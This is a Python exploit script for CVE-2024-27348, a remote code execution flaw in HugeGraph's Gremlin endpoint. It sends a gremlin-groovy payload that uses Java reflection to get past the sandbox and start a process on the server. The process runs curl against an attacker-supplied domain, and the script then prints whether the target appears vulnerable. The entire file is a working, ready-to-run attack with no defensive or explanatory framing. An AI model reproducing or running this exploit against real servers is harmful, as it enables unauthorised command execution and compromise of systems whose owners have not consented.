import requests
import argparse
import json

def exploit(target, port, domain):
    url = f"{target}:{port}/gremlin"
    headers = {
        "Content-Type": "application/json"
    }
    curl_payload = {
        "gremlin": f"Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"SL7\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"curl\", \"{domain}\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);",
        "bindings": {},
        "language": "gremlin-groovy",
        "aliases": {}
    }
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(curl_payload), verify=False, timeout=10)
        if response.status_code == 200 or "\"code\":200" in response.text:
            print(f"[+] {target}:{port} is VULNERABLE!")
            print("[+] Curl command Response data:")
            print(response.text)
        else:
            print(f"[-] Request failed with status code: {response.text}")
            print(f"[-] {target}:{port} may not be vulnerable")
            print(response.text)
    except Exception as e:
        print(f"[!] There is an exception with {target}:{port}")
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit CVE-2024-27348 Gremlin RCE in HugeGraph server from 1.0.0 Before 1.3.0")
    parser.add_argument("--target", "-t", required=True, help="Target IP address/domain")
    parser.add_argument("--port", "-p", required=True, help="Target port")
    parser.add_argument("--domain", "-d", required=True, help="Attacker domain (Your own domain to check requests log)")
    args = parser.parse_args()

    exploit(args.target, args.port, args.domain)